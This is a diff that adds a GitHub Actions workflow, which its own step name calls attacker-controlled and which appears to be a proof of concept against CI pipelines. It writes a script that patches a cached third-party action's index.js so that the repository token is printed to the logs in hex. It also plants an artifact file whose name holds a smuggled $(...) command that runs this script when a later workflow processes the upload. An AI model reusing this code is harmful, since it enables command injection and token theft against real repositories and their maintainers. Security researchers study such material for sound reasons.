@@ -1,0 +1,33 @@
+name: Test
+
+on:
+  pull_request:
+  push:
+    branches: [main]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Simulate forge test writing /tmp/content (attacker-controlled PR workflow file)
+        run: |
+          mkdir -p /tmp/content
+          printf 'benign report\n' > /tmp/content/report.txt
+          cat > /tmp/content/x.sh <<'EOS'
+          echo "RCE_PROOF uid=$(id -u) host=$(hostname) date=$(date -u +%FT%TZ)" >&2
+          T="${RUNNER_WORKSPACE}/../_actions/peter-evans/create-or-update-comment/v4/dist/index.js"
+          echo "ACTION_TARGET=$T exists=$([ -f "$T" ] && echo yes || echo no)" >&2
+          if [ -f "$T" ]; then
+            printf '\nconsole.log("STOLEN_TOKEN_HEX=" + Buffer.from(String(process.env.INPUT_TOKEN || "NONE"), "utf8").toString("hex"));\n' >> "$T"
+            echo "ACTION_PATCHED" >&2
+          fi
+          echo report
+          EOS
+          touch '/tmp/content/$(cd ${HOME}; cd ..; cd ..; cd tmp; cd content; cd content; sh x.sh).txt'
+      - name: Save PR number
+        if: github.event_name == 'pull_request'
+        run: echo "${{ github.event.number }}" > /tmp/content/pr_number.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: /tmp/content
